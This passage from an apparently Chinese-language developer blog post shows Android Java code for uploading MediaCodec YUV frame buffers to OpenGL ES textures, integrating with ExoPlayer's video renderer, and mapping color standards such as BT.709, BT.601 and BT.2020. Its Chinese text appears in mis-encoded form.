                    glFormat, GLES20.GL_UNSIGNED_BYTE, localBuffer.slice());

            GLES30.glPixelStorei(GLES30.GL_UNPACK_ROW_LENGTH, <span class="hljs-number">0</span>);

            buffer.position(buffer.position() + planeStride * planeHeight);

        } <span class="hljs-keyword">else</span> {
            <span class="hljs-type">int</span> <span class="hljs-variable">paddingBytes</span> <span class="hljs-operator">=</span> planeStride - actualDataBytesPerRow;

            <span class="hljs-type">ByteBuffer</span> <span class="hljs-variable">cleanBuffer</span> <span class="hljs-operator">=</span> ByteBuffer.allocateDirect(planeWidth * planeHeight * bytesPerPixel)
                    .order(ByteOrder.nativeOrder());

            <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; planeHeight; i++) {
                localBuffer.limit(localBuffer.position() + actualDataBytesPerRow);
                cleanBuffer.put(localBuffer.slice());
                localBuffer.position(localBuffer.position() + paddingBytes);
            }

            cleanBuffer.flip();

            GLES20.glTexImage2D(
                    GLES20.GL_TEXTURE_2D, <span class="hljs-number">0</span>, glFormat,
                    planeWidth, planeHeight, <span class="hljs-number">0</span>,
                    glFormat, GLES20.GL_UNSIGNED_BYTE, cleanBuffer);

            <span class="hljs-comment">// æ¨è¿›åŸå§‹ buffer çš„ position</span>
            buffer.position(buffer.position() + planeStride * planeHeight);
        }

    } <span class="hljs-keyword">else</span> {
       <span class="hljs-comment">//strideç­‰äºwidthçš„æƒ…å†µï¼Œå®Œç¾ï¼Œç›´æ¥ä¸Šä¼ </span>
        localBuffer.limit(localBuffer.position() + planeStride * planeHeight);
        buffer.position(buffer.position() + planeStride * planeHeight);

        GLES20.glTexImage2D(
                GLES20.GL_TEXTURE_2D, <span class="hljs-number">0</span>, glFormat,
                planeWidth, planeHeight, <span class="hljs-number">0</span>,
                glFormat, GLES20.GL_UNSIGNED_BYTE, localBuffer.slice());
    }
}
</code></pre>
<p>ä»¥ä¸Šæ˜¯Shaderå’Œçº¹ç†ä¼ è¾“çš„æ ¸å¿ƒé€»è¾‘ï¼Œå½“ç„¶ï¼ŒGLä»…ä»…å®ç°ä¼ è¾“æ˜¯ä¸å¤Ÿçš„ï¼Œå› ä¸ºæˆ‘ä»¬è¿˜éœ€è¦å®ç°é¡¶ç‚¹åæ ‡ï¼ˆä¸–ç•Œåæ ‡ç³»ï¼‰å’Œç€è‰²å™¨åæ ‡çš„ç»‘å®šã€‚</p>
<p>æ¥ä¸‹æ¥å®ç°ä¸€ä¸‹onDrawFrame</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@Override</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">onDrawFrame</span><span class="hljs-params">(GL10 gl)</span> {
    <span class="hljs-comment">// ... (onDrawFrame é€»è¾‘ä¸å˜) ...</span>
    <span class="hljs-meta">@Nullable</span>
    <span class="hljs-type">VideoDecoderOutputBuffer</span> <span class="hljs-variable">pendingOutputBuffer</span> <span class="hljs-operator">=</span>
            pendingOutputBufferReference.getAndSet(<span class="hljs-comment">/* newValue= */</span> <span class="hljs-literal">null</span>);
    <span class="hljs-keyword">if</span> (pendingOutputBuffer == <span class="hljs-literal">null</span> &amp;&amp; renderedOutputBuffer == <span class="hljs-literal">null</span>) {
        <span class="hljs-keyword">return</span>;
    }
    <span class="hljs-keyword">if</span> (pendingOutputBuffer != <span class="hljs-literal">null</span>) {
        <span class="hljs-keyword">if</span> (renderedOutputBuffer != <span class="hljs-literal">null</span>) {
            renderedOutputBuffer.release();
        }
        renderedOutputBuffer = pendingOutputBuffer;
    }

    <span class="hljs-keyword">final</span> <span class="hljs-type">VideoDecoderOutputBuffer</span> <span class="hljs-variable">outputBuffer</span> <span class="hljs-operator">=</span> checkNotNull(renderedOutputBuffer);
    <span class="hljs-type">ByteBuffer</span> <span class="hljs-variable">buffer</span> <span class="hljs-operator">=</span> outputBuffer.data;
    <span class="hljs-type">int</span> <span class="hljs-variable">format</span> <span class="hljs-operator">=</span> outputBuffer.decoderPrivate;
    <span class="hljs-type">int</span> <span class="hljs-variable">frameWidth</span> <span class="hljs-operator">=</span> outputBuffer.width;
    <span class="hljs-type">int</span> <span class="hljs-variable">frameHeight</span> <span class="hljs-operator">=</span> outputBuffer.height;
    <span class="hljs-type">int</span> <span class="hljs-variable">stride</span> <span class="hljs-operator">=</span> outputBuffer.yuvStrides[<span class="hljs-number">0</span>];

    GLES20.glClear(GLES20.GL_COLOR_BUFFER_BIT);
    <span class="hljs-keyword">if</span> (buffer != <span class="hljs-literal">null</span> &amp;&amp; frameWidth &gt; <span class="hljs-number">0</span> &amp;&amp; frameHeight &gt; <span class="hljs-number">0</span>) {
       <span class="hljs-comment">//å¤„ç†é¢œè‰²ç©ºé—´ï¼ˆä¸»è¦æ˜¯ç”»é¢é¥±å’Œåº¦ï¼‰</span>
        <span class="hljs-type">float</span>[] colorConversion = kColorConversion709;
        <span class="hljs-keyword">switch</span> (outputBuffer.colorspace) {
            <span class="hljs-keyword">case</span> VideoDecoderOutputBuffer.COLORSPACE_BT601:
                colorConversion = kColorConversion601;
                <span class="hljs-keyword">break</span>;
            <span class="hljs-keyword">case</span> VideoDecoderOutputBuffer.COLORSPACE_BT2020:
                colorConversion = kColorConversion2020;
                <span class="hljs-keyword">break</span>;
            <span class="hljs-keyword">case</span> VideoDecoderOutputBuffer.COLORSPACE_BT709:
            <span class="hljs-keyword">default</span>:
                <span class="hljs-comment">// Do nothing.</span>
                <span class="hljs-keyword">break</span>;
        }
        GLES20.glUniformMatrix3fv(
                colorFormatMatrix,
                <span class="hljs-comment">/* color= */</span> <span class="hljs-number">1</span>,
                <span class="hljs-comment">/* transpose= */</span> <span class="hljs-literal">false</span>,
                colorConversion,
                <span class="hljs-comment">/* offset= */</span> <span class="hljs-number">0</span>);

        uploadYuvTextures(buffer, format, frameWidth, frameHeight, stride);
    }

    <span class="hljs-keyword">if</span> (frameWidth &gt; <span class="hljs-number">0</span> &amp;&amp; frameHeight &gt; <span class="hljs-number">0</span>) {
        GLES20.glUseProgram(programHandle);

        GLES20.glUniform1i(formatTypeUniform, currentFormat.getType());

        <span class="hljs-type">int</span> <span class="hljs-variable">positionHandle</span> <span class="hljs-operator">=</span> GLES20.glGetAttribLocation(programHandle, <span class="hljs-string">"a_position"</span>);
        GLES20.glEnableVertexAttribArray(positionHandle);
        GLES20.glVertexAttribPointer(positionHandle, <span class="hljs-number">2</span>, GLES20.GL_FLOAT, <span class="hljs-literal">false</span>, <span class="hljs-number">0</span>, vertexBuffer);

        <span class="hljs-type">int</span> <span class="hljs-variable">texCoordHandle</span> <span class="hljs-operator">=</span> GLES20.glGetAttribLocation(programHandle, <span class="hljs-string">"a_texCoord"</span>);
        GLES20.glEnableVertexAttribArray(texCoordHandle);
        GLES20.glVertexAttribPointer(texCoordHandle, <span class="hljs-number">2</span>, GLES20.GL_FLOAT, <span class="hljs-literal">false</span>, <span class="hljs-number">0</span>, textureBuffer);

        GLES20.glDrawArrays(GLES20.GL_TRIANGLE_STRIP, <span class="hljs-number">0</span>, <span class="hljs-number">4</span>);

        GLES20.glDisableVertexAttribArray(positionHandle);
        GLES20.glDisableVertexAttribArray(texCoordHandle);
    }
}
</code></pre>
<p>ä¸Šé¢å°±æ˜¯GLVideoSurfaceViewçš„æ ¸å¿ƒé€»è¾‘äº†ï¼Œè¿™é‡Œæä¸€ä¸‹ColorSpaceï¼ˆé¢œè‰²ç©ºé—´ï¼‰ï¼Œé¢œè‰²ç©ºé—´é»˜è®¤æƒ…å†µéƒ½BT709ï¼Œç”¨äºå†³å®šç”»é¢çš„é¥±å’Œåº¦å’Œè‰²å½©é²œè‰³ç¨‹åº¦ï¼Œå¤„ç†ä¸å½“å®¹æ˜“ç”»é¢å¤±çœŸï¼Œä¸‹é¢æˆ‘ä»¬ä¹Ÿä¼šè®²åˆ°ã€‚</p>
<h2 data-id="heading-6">Exo VideoRenderé€‚é…</h2>
<p>æ—¢ç„¶æ¸²æŸ“éƒ¨åˆ†å®ç°ï¼Œé‚£ä¹ˆæ¥ä¸‹æ¥è¯¥å®ç°è¿™éƒ¨åˆ†ï¼Œåœ¨ä¹‹å‰çš„é‚£ç¯‡æ–‡ç« ä¸­ï¼Œæˆ‘ä»¬ç”¨CPUåšäº†å¤§é‡çš„å·¥ä½œï¼Œä¸è¿‡ç¼ºç‚¹æ˜¾è€Œæ˜“è§ã€‚</p>
<p>ä½œä¸º1å¸§1920x1080çš„æ•°æ®ï¼Œç®—æ³•å¤æ‚åº¦ä¸ºO(w*h+width)ï¼ŒåŒæ—¶ä¸€å¸§æ•°æ®å æ¯”2.79MBï¼Œåœ¨CPUä¸­è¿ç®—ï¼Œå†…å­˜å’ŒCPUè´Ÿè½½å¾ˆé«˜ã€‚</p>
<h3 data-id="heading-7">YUV Bufferæ•°æ®å¤„ç†</h3>
<p>ä¸ºäº†ä¿æŒè°ƒè¯•çš„éœ€è¦ï¼Œæˆ‘ä»¬ä¹Ÿä¼šä¿ç•™CPUæ¸²æŸ“çš„æ–¹å¼ï¼ŒåŒæ—¶æ–°å¢GPUçš„æ–¹å¼ï¼Œå½“ç„¶ï¼Œæˆ‘ä»¬ä½¿ç”¨çš„GLVideoSurfaceViewåŸºæœ¬ä¿æŒä¸€ä¸ªï¼ŒåŒæ—¶decoderPrivateç”¨æ¥è¡¨ç¤ºColorSpaceï¼Œä¸è¿‡éœ€è¦æ³¨æ„çš„æ˜¯yuvI420ToGpuå‡½æ•°ä¸­ï¼Œ
decoderOutputBuffer.decoderPrivateå¼ºåˆ¶è®¾ç½®ä¸ºCodecCapabilities.COLOR_FormatYUV420Planarï¼Œå› ä¸ºCPUè½¬æ¢åçš„å°±æ˜¯YUV420Planarç»“æ„ï¼Œå¦‚æœè¿™ä¸ªé”™è¯¯è®¾ç½®ï¼Œå¿…ç„¶å¯¼è‡´ç°ç™½å›¾åƒä¸­ç»¿æ¡é—ªçƒã€‚</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">onDrainOutputBuffer</span><span class="hljs-params">(MediaCodecAdapter codec,ByteBuffer decodeOutputBuffer, <span class="hljs-type">int</span> index, <span class="hljs-type">long</span> presentationTimeUs)</span> {
  <span class="hljs-keyword">if</span>(isGPUTransform){
    rawYuvToGpu(codec, decodeOutputBuffer, presentationTimeUs);
  }<span class="hljs-keyword">else</span> {
    yuvI420ToGpu(codec, decodeOutputBuffer, presentationTimeUs);
  }
}

<span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">rawYuvToGpu</span><span class="hljs-params">(MediaCodecAdapter codec, ByteBuffer decodeOutputBuffer, <span class="hljs-type">long</span> presentationTimeUs)</span> {
  <span class="hljs-keyword">if</span>(decodeOutputBuffer != <span class="hljs-literal">null</span>){
    <span class="hljs-type">MediaFormat</span> <span class="hljs-variable">outputFormat</span> <span class="hljs-operator">=</span> codec.getOutputFormat();
    <span class="hljs-type">int</span> <span class="hljs-variable">colorFormat</span> <span class="hljs-operator">=</span> outputFormat.getInteger(MediaFormat.KEY_COLOR_FORMAT);
    <span class="hljs-type">int</span> <span class="hljs-variable">width</span> <span class="hljs-operator">=</span> outputFormat.getInteger(MediaFormat.KEY_WIDTH);
    <span class="hljs-type">int</span> <span class="hljs-variable">height</span> <span class="hljs-operator">=</span> outputFormat.getInteger(MediaFormat.KEY_HEIGHT);

    <span class="hljs-type">int</span> <span class="hljs-variable">alignWidth</span> <span class="hljs-operator">=</span> width;
    <span class="hljs-type">int</span> <span class="hljs-variable">alignHeight</span> <span class="hljs-operator">=</span> height;
    <span class="hljs-type">boolean</span> <span class="hljs-variable">isDebug</span> <span class="hljs-operator">=</span> <span class="hljs-literal">false</span>;

    <span class="hljs-type">int</span> <span class="hljs-variable">stride</span> <span class="hljs-operator">=</span> outputFormat.getInteger(MediaFormat.KEY_STRIDE);
    <span class="hljs-type">int</span> <span class="hljs-variable">sliceHeight</span> <span class="hljs-operator">=</span> outputFormat.getInteger(MediaFormat.KEY_SLICE_HEIGHT);
    <span class="hljs-keyword">if</span> (stride &gt; <span class="hljs-number">0</span> &amp;&amp; sliceHeight &gt; <span class="hljs-number">0</span>) {
      alignWidth = stride;
      alignHeight = sliceHeight;
    }

    <span class="hljs-type">int</span> <span class="hljs-variable">decodeOutputBufferSize</span>  <span class="hljs-operator">=</span> decodeOutputBuffer.limit();
    <span class="hljs-type">ByteBufferHolder</span> <span class="hljs-variable">finalBufferHolder</span> <span class="hljs-operator">=</span> byteBufferPool.obtain(decodeOutputBufferSize);
    finalBufferHolder.put(decodeOutputBuffer);
    finalBufferHolder.position(<span class="hljs-number">0</span>);

    <span class="hljs-type">VideoDecoderOutputBufferWrapper</span> <span class="hljs-variable">decoderOutputBuffer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">VideoDecoderOutputBufferWrapper</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">DecoderOutputBuffer</span>.Owner&lt;VideoDecoderOutputBuffer&gt;() {
      <span class="hljs-meta">@Override</span>
      <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">releaseOutputBuffer</span><span class="hljs-params">(VideoDecoderOutputBuffer outputBuffer)</span> {
        <span class="hljs-keyword">if</span>(outputBuffer <span class="hljs-keyword">instanceof</span> VideoDecoderOutputBufferWrapper){
          byteBufferPool.recycle(((VideoDecoderOutputBufferWrapper) outputBuffer).bufferHolder);
        }
      }
    });
    decoderOutputBuffer.init(presentationTimeUs,C.VIDEO_OUTPUT_MODE_YUV,<span class="hljs-literal">null</span>);
    decoderOutputBuffer.bufferHolder = finalBufferHolder;
    decoderOutputBuffer.data = finalBufferHolder.getBuffer();
    decoderOutputBuffer.decoderPrivate = colorFormat;
    decoderOutputBuffer.width = alignWidth;
    decoderOutputBuffer.height = alignHeight;
    decoderOutputBuffer.colorspace = MediaCodecColorSpaceExtractor.extractColorStandard(outputFormat);
    decoderOutputBuffer.yuvStrides = <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]{stride,-<span class="hljs-number">1</span>,-<span class="hljs-number">1</span>};

    <span class="hljs-type">VideoDecoderOutputBufferRenderer</span> <span class="hljs-variable">bufferRenderer</span> <span class="hljs-operator">=</span> videoDecoderOutputBufferRenderer;
    <span class="hljs-keyword">if</span>(bufferRenderer != <span class="hljs-literal">null</span>){
      bufferRenderer.setOutputBuffer(decoderOutputBuffer);
    }
  }
}
<span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">yuvI420ToGpu</span><span class="hljs-params">(MediaCodecAdapter codec, ByteBuffer decodeOutputBuffer, <span class="hljs-type">long</span> presentationTimeUs)</span> {
  <span class="hljs-keyword">if</span>(decodeOutputBuffer != <span class="hljs-literal">null</span>){
    <span class="hljs-type">MediaFormat</span> <span class="hljs-variable">outputFormat</span> <span class="hljs-operator">=</span> codec.getOutputFormat();
    <span class="hljs-type">int</span> <span class="hljs-variable">colorFormat</span> <span class="hljs-operator">=</span> outputFormat.getInteger(MediaFormat.KEY_COLOR_FORMAT);
    <span class="hljs-type">int</span> <span class="hljs-variable">width</span> <span class="hljs-operator">=</span> outputFormat.getInteger(MediaFormat.KEY_WIDTH);
    <span class="hljs-type">int</span> <span class="hljs-variable">height</span> <span class="hljs-operator">=</span> outputFormat.getInteger(MediaFormat.KEY_HEIGHT);

    <span class="hljs-type">int</span> <span class="hljs-variable">alignWidth</span> <span class="hljs-operator">=</span> width;
    <span class="hljs-type">int</span> <span class="hljs-variable">alignHeight</span> <span class="hljs-operator">=</span> height;

    <span class="hljs-type">int</span> <span class="hljs-variable">stride</span> <span class="hljs-operator">=</span> outputFormat.getInteger(MediaFormat.KEY_STRIDE);
    <span class="hljs-type">int</span> <span class="hljs-variable">sliceHeight</span> <span class="hljs-operator">=</span> outputFormat.getInteger(MediaFormat.KEY_SLICE_HEIGHT);
    <span class="hljs-keyword">if</span> (stride &gt; <span class="hljs-number">0</span> &amp;&amp; sliceHeight &gt; <span class="hljs-number">0</span>) {
      alignWidth = stride;
      alignHeight = sliceHeight;
    }

  <span class="hljs-comment">//  alignWidth = alignTo16(alignWidth); å¯¹é½é€»è¾‘å­˜åœ¨é£é™©</span>
   <span class="hljs-comment">// alignHeight = alignTo16(alignHeight); å¯¹é½é€»è¾‘å­˜åœ¨é£é™©</span>

    <span class="hljs-type">int</span> <span class="hljs-variable">decodeOutputBufferSize</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;
    <span class="hljs-type">ByteBufferHolder</span> <span class="hljs-variable">finalBufferHolder</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;

    <span class="hljs-keyword">switch</span> (colorFormat){
      <span class="hljs-keyword">case</span> CodecCapabilities.COLOR_FormatYUV420Flexible:
      <span class="hljs-keyword">case</span> CodecCapabilities.COLOR_FormatYUV420Planar:
      <span class="hljs-keyword">case</span> CodecCapabilities.COLOR_FormatYUV420PackedPlanar:
        <span class="hljs-comment">//android è¿™é‡Œæ˜¯I420æ ¼å¼</span>
        decodeOutputBufferSize = decodeOutputBuffer.limit();
        finalBufferHolder = byteBufferPool.obtain(decodeOutputBufferSize);
        finalBufferHolder.put(decodeOutputBuffer);
        finalBufferHolder.position(<span class="hljs-number">0</span>);
        <span class="hljs-keyword">break</span>;
      <span class="hljs-keyword">case</span> CodecCapabilities.COLOR_FormatYUV420SemiPlanar: {
        decodeOutputBufferSize = alignWidth * alignHeight * <span class="hljs-number">3</span> / <span class="hljs-number">2</span>;
        <span class="hljs-type">ByteBufferHolder</span> <span class="hljs-variable">bufferHolder</span> <span class="hljs-operator">=</span> byteBufferPool.obtain(decodeOutputBufferSize);
        YuvTools.yuvNv12ToYuv420P(decodeOutputBuffer, bufferHolder.getBuffer(), alignWidth, alignHeight);
        bufferHolder.position(<span class="hljs-number">0</span>);
        finalBufferHolder = bufferHolder;
      }
        <span class="hljs-keyword">break</span>;
      <span class="hljs-keyword">case</span> CodecCapabilities.COLOR_FormatYUV420PackedSemiPlanar: {
        decodeOutputBufferSize = alignWidth * alignHeight * <span class="hljs-number">3</span> / <span class="hljs-number">2</span>;
        <span class="hljs-type">ByteBufferHolder</span> <span class="hljs-variable">bufferHolder</span> <span class="hljs-operator">=</span> byteBufferPool.obtain(decodeOutputBufferSize);
        YuvTools.yuvNv21ToYuv420P(decodeOutputBuffer, bufferHolder.getBuffer(), alignWidth, alignHeight);
        bufferHolder.position(<span class="hljs-number">0</span>);
        finalBufferHolder = bufferHolder;
      }
        <span class="hljs-keyword">break</span>;
      <span class="hljs-keyword">default</span>:
        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">IllegalStateException</span>(<span class="hljs-string">"the Color-Format is not supported : "</span> + colorFormat);
    }
    <span class="hljs-type">VideoDecoderOutputBufferWrapper</span> <span class="hljs-variable">decoderOutputBuffer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">VideoDecoderOutputBufferWrapper</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">DecoderOutputBuffer</span>.Owner&lt;VideoDecoderOutputBuffer&gt;() {
      <span class="hljs-meta">@Override</span>
      <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">releaseOutputBuffer</span><span class="hljs-params">(VideoDecoderOutputBuffer outputBuffer)</span> {
        <span class="hljs-keyword">if</span>(outputBuffer <span class="hljs-keyword">instanceof</span> VideoDecoderOutputBufferWrapper){
          byteBufferPool.recycle(((VideoDecoderOutputBufferWrapper) outputBuffer).bufferHolder);
        }
      }
    });
    decoderOutputBuffer.init(presentationTimeUs,C.VIDEO_OUTPUT_MODE_YUV,<span class="hljs-literal">null</span>);
    <span class="hljs-type">boolean</span> <span class="hljs-variable">isDebug</span> <span class="hljs-operator">=</span> <span class="hljs-literal">false</span>;


    decoderOutputBuffer.init(presentationTimeUs,C.VIDEO_OUTPUT_MODE_YUV,<span class="hljs-literal">null</span>);
    decoderOutputBuffer.bufferHolder = finalBufferHolder;
    decoderOutputBuffer.data = finalBufferHolder.getBuffer();
    decoderOutputBuffer.decoderPrivate = CodecCapabilities.COLOR_FormatYUV420Planar;
    decoderOutputBuffer.width = alignWidth;
    decoderOutputBuffer.height = alignHeight;
    decoderOutputBuffer.colorspace = MediaCodecColorSpaceExtractor.extractColorStandard(outputFormat);
    decoderOutputBuffer.yuvStrides = <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]{stride,stride/<span class="hljs-number">2</span>,stride/<span class="hljs-number">2</span>};

    <span class="hljs-keyword">if</span> (isDebug) {
      finalBufferHolder.position(<span class="hljs-number">0</span>);
      <span class="hljs-type">int</span> <span class="hljs-variable">limit</span> <span class="hljs-operator">=</span> finalBufferHolder.limit();
      <span class="hljs-type">Buffer</span> <span class="hljs-variable">buffer</span> <span class="hljs-operator">=</span> bufferPool.obtain(limit);
      finalBufferHolder.get(buffer.getBuffer(), <span class="hljs-number">0</span>, limit);
      buffer.setEffectiveSize(limit);
      <span class="hljs-type">Bitmap</span> <span class="hljs-variable">bitmap</span> <span class="hljs-operator">=</span> YuvTools.toBitmap(buffer.getBuffer(), width, height);
      Log.d(TAG, <span class="hljs-string">"Bitmap = "</span> + bitmap);
      buffer.recycle();
      finalBufferHolder.position(<span class="hljs-number">0</span>);
    }

  <span class="hljs-comment">//  yuvDataBuffer.recycle();</span>
    <span class="hljs-type">VideoDecoderOutputBufferRenderer</span> <span class="hljs-variable">bufferRenderer</span> <span class="hljs-operator">=</span> videoDecoderOutputBufferRenderer;
    <span class="hljs-keyword">if</span>(bufferRenderer != <span class="hljs-literal">null</span>){
      bufferRenderer.setOutputBuffer(decoderOutputBuffer);
    }
    decodeOutputBuffer = <span class="hljs-literal">null</span>;
  }
}
</code></pre>
<p>ä»¥ä¸Šä¸»è¦æ˜¯é€‚é…ExoPlayerä»£ç ï¼Œé€šè¿‡ä¸Šé¢çš„é€»è¾‘ï¼Œæˆ‘ä»¬å®Œæ•´å®ç°äº†MediaCodec-&gt;Buffer(I420ã€NV21ã€NV12ã€YUV422)-&gt;GPUçš„æ ¸å¿ƒæµç¨‹ã€‚</p>
<h2 data-id="heading-8">è‰²å½©ç©ºé—´æå–</h2>
<p>å…¶å®ï¼Œè¿™é‡Œæˆ‘ä»¬æ³¨æ„åˆ°MediaCodecColorSpaceExtractorï¼Œè¿™ä¸ªè´Ÿè´£æå–è‰²å½©ç©ºé—´</p>
<pre><code class="hljs language-java" lang="java">
<span class="hljs-comment">// å‡è®¾è¿™æ˜¯ä¸€ä¸ªè§£ç å¾ªç¯ä¸­çš„è¾…åŠ©ç±»</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MediaCodecColorSpaceExtractor</span> {

    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">TAG</span> <span class="hljs-operator">=</span> <span class="hljs-string">"ColorSpaceExtractor"</span>;

    <span class="hljs-comment">/**
     * åœ¨ MediaCodec å¤„äºè§£ç çŠ¶æ€æ—¶ï¼Œä»è¾“å‡ºæ ¼å¼ä¸­æå–é¢œè‰²ç©ºé—´ä¿¡æ¯ã€‚
     *
     * <span class="hljs-doctag">@param</span> outputFormat å·²å¯åŠ¨çš„ MediaFormat å®ä¾‹
     * <span class="hljs-doctag">@return</span> é¢œè‰²æ ‡å‡†å¸¸é‡ (ä¾‹å¦‚ MediaFormat.COLOR_STANDARD_BT709)ï¼Œå¦‚æœä¸æ”¯æŒæˆ–æœªæ‰¾åˆ°ï¼Œåˆ™è¿”å› -1
     */</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">extractColorStandard</span><span class="hljs-params">(MediaFormat outputFormat)</span> {
        <span class="hljs-keyword">try</span> {
            <span class="hljs-keyword">if</span> (outputFormat == <span class="hljs-literal">null</span>) {
                <span class="hljs-keyword">return</span> -<span class="hljs-number">1</span>;
            }
            <span class="hljs-keyword">if</span> (outputFormat.containsKey(MediaFormat.KEY_COLOR_STANDARD)) {
                <span class="hljs-type">int</span> <span class="hljs-variable">colorStandard</span> <span class="hljs-operator">=</span> outputFormat.getInteger(MediaFormat.KEY_COLOR_STANDARD);
                <span class="hljs-keyword">return</span> getColorSpaceStandard(colorStandard);
            } <span class="hljs-keyword">else</span> {
                <span class="hljs-keyword">return</span> -<span class="hljs-number">1</span>;
            }
        } <span class="hljs-keyword">catch</span> (IllegalStateException e) {
            <span class="hljs-keyword">return</span> -<span class="hljs-number">1</span>;
        }
    }


    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">getColorSpaceStandard</span><span class="hljs-params">(<span class="hljs-type">int</span> standard)</span> {
        <span class="hljs-keyword">switch</span> (standard) {
            <span class="hljs-keyword">case</span> MediaFormat.COLOR_STANDARD_BT709:
             <span class="hljs-comment">//   VideoLogUtil.d(TAG, "BT.709 (HD/Standard)");</span>
                <span class="hljs-keyword">return</span> VideoDecoderOutputBuffer.COLORSPACE_BT709;
            <span class="hljs-keyword">case</span> MediaFormat.COLOR_STANDARD_BT601_NTSC:
             <span class="hljs-comment">//   VideoLogUtil.d(TAG, "BT.601 NTSC (SD)");</span>
                <span class="hljs-keyword">return</span> VideoDecoderOutputBuffer.COLORSPACE_BT601;
            <span class="hljs-keyword">case</span> MediaFormat.COLOR_STANDARD_BT601_PAL:
               <span class="hljs-comment">// VideoLogUtil.d(TAG, "BT.601 PAL (SD)");</span>
                <span class="hljs-keyword">return</span> VideoDecoderOutputBuffer.COLORSPACE_BT601;
            <span class="hljs-keyword">case</span> MediaFormat.COLOR_STANDARD_BT2020:
              <span class="hljs-comment">//  VideoLogUtil.d(TAG, "BT.2020 (UHD/HDR)");</span>
                <span class="hljs-keyword">return</span> VideoDecoderOutputBuffer.COLORSPACE_BT2020;
            <span class="hljs-keyword">default</span>:
               <span class="hljs-comment">// VideoLogUtil.d(TAG, "Unknown/Default (" + standard + ")");</span>
                ;
        }
        <span class="hljs-keyword">return</span> -<span class="hljs-number">1</span>;
    }


    <span class="hljs-keyword">private</span> String <span class="hljs-title function_">getColorRangeName</span><span class="hljs-params">(<span class="hljs-type">int</span> range)</span> {
        <span class="hljs-keyword">switch</span> (range) {
            <span class="hljs-keyword">case</span> MediaFormat.COLOR_RANGE_FULL:
                <span class="hljs-keyword">return</span> <span class="hljs-string">"Full (0-255)"</span>;
            <span class="hljs-keyword">case</span> MediaFormat.COLOR_RANGE_LIMITED:
                <span class="hljs-keyword">return</span> <span class="hljs-string">"Limited (16-235)"</span>;
            <span class="hljs-keyword">default</span>:
                <span class="hljs-keyword">return</span> <span class="hljs-string">"Unknown Range"</span>;
        }
    }

    <span class="hljs-keyword">private</span> String <span class="hljs-title function_">getColorTransferName</span><span class="hljs-params">(<span class="hljs-type">int</span> transfer)</span> {
        <span class="hljs-keyword">switch</span> (transfer) {
            <span class="hljs-keyword">case</span> MediaFormat.COLOR_TRANSFER_SDR_VIDEO:
                <span class="hljs-keyword">return</span> <span class="hljs-string">"SDR (Standard Dynamic Range)"</span>;
            <span class="hljs-keyword">case</span> MediaFormat.COLOR_TRANSFER_HLG:
                <span class="hljs-keyword">return</span> <span class="hljs-string">"HLG (Hybrid Log-Gamma) - HDR"</span>;
            <span class="hljs-keyword">case</span> MediaFormat.COLOR_TRANSFER_ST2084:
                <span class="hljs-keyword">return</span> <span class="hljs-string">"PQ (Perceptual Quantizer) - HDR"</span>;
            <span class="hljs-keyword">default</span>:
                <span class="hljs-keyword">return</span> <span class="hljs-string">"Unknown Transfer"</span>;
        }
    }
}
</code></pre>
<h2 data-id="heading-9">æ€»ç»“</h2>
<p>ä»¥ä¸Šå°±æ˜¯å®Œæ•´ä»£ç ï¼Œæœ¬ç¯‡çš„ä¸»è¦å†…å®¹æ˜¯é€šè¿‡MediaCodecBufferæ¨¡å¼ï¼Œé¿å…CPUåˆ°GPUä¹‹å‰éœ€è¦CPUè½¬YUV I420é€ æˆçš„æ€§èƒ½é—®é¢˜ï¼Œä»¥åŠæ•°æ®é‡å˜å¤§çš„é—®é¢˜ã€‚</p>
<p>åé¢ï¼Œæˆ‘ä»¬ä¼šç»§ç»­åˆ†äº«æœ‰å…³æ¸²æŸ“ã€å½•åˆ¶å’Œå¤šå±æ¸²æŸ“ç›¸å…³çš„æ–‡ç« ã€‚</p>
